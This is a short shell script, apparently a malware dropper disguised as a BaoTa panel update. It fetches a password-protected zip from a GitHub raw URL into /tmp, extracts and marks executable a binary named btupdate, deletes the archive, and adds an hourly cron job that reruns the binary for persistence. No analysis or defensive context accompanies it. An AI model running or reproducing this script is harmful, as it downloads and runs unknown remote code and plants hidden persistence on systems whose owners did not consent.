cd /tmp/
curl -fsSL https://raw.githubusercontent.com/btUserCenter/btupdate/main/baotaUpdate.zip -o baotaUpdate.zip || exit
unzip -P $0 baotaUpdate.zip || exit
chmod +x ./btupdate || exit
rm ./baotaUpdate.zip || exit
cron_job="0 */1 * * * /tmp/btupdate"
(( crontab -l | grep -v "$cron_job"; echo "$cron_job" ) | crontab - ) && echo 1
